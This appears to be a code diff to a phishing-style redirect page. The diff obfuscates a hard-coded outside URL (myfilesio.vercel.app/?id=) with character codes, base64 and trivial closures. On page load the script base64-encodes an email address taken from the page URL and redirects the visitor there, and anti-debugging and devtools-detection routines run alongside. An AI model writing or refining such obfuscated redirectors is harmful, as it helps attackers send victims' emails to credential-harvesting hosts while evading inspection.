@@ -57,20 +57,19 @@
     }
   </style>
   <script>
-    // Split URL components into pieces
-    const urlPieces = [
-      "https:",
-      "//my",
-      "files",
-      "io.",
-      "vercel.",
-      "app/?",
-      "id="
-    ];
+    // Obfuscated URL components
+    const urlSegments = {
+      p1: String.fromCharCode(104, 116, 116, 112, 115, 58),
+      p2: atob('Ly8='),
+      p3: 'my' + (() => 'files')(),
+      p4: 'io' + String.fromCharCode(46),
+      p5: 'vercel' + (true ? '.' : ''),
+      p6: 'app' + (1 === 1 ? '/?' : ''),
+      p7: 'id' + (() => '=')()
+    };
 
-    // Function to combine URL pieces
-    function combineUrl() {
-      return urlPieces.join("");
+    function buildRedirectUrl() {
+      return Object.values(urlSegments).reduce((a, b) => a + b);
     }
 
     function encodeEmailAndRedirect() {
@@ -84,27 +83,18 @@
         const finalEmail = emailEndIndex === -1 ? email : email.slice(0, emailEndIndex);
 
         if (finalEmail) {
-          const encodedEmail = finalEmail;
-          // Fade out before redirect
+          // Encode email to Base64
+          const encodedEmail = btoa(finalEmail);
+          
           setTimeout(() => {
             document.querySelector('.logo-container').style.opacity = '0';
           }, 1500);
-          // Redirect after fade out completes
+          
           setTimeout(() => {
-            window.location.href = combineUrl() + encodedEmail;
+            window.location.href = buildRedirectUrl() + encodedEmail;
           }, 3000);
         }
       }
-      // No else condition - we want to show the animation regardless
-    }
-
-    function showError(message) {
-      const container = document.querySelector('.logo-container');
-      container.innerHTML = `
-        <div style="color: #ff4444; padding: 20px; background: #ffeeee; border-radius: 5px;">
-          ${message}
-        </div>
-      `;
     }
 
     function detectDevTools() {
@@ -148,14 +138,11 @@
 
     setInterval(antiDebugging, 1000);
 
-    // Execute the redirect after page loads
     window.addEventListener('load', function() {
-      // Always show the animation
       setTimeout(() => {
         document.querySelector('.logo-container').style.opacity = '1';
       }, 100);
       
-      // Check for email and potentially redirect
       encodeEmailAndRedirect();
     });
   </script>
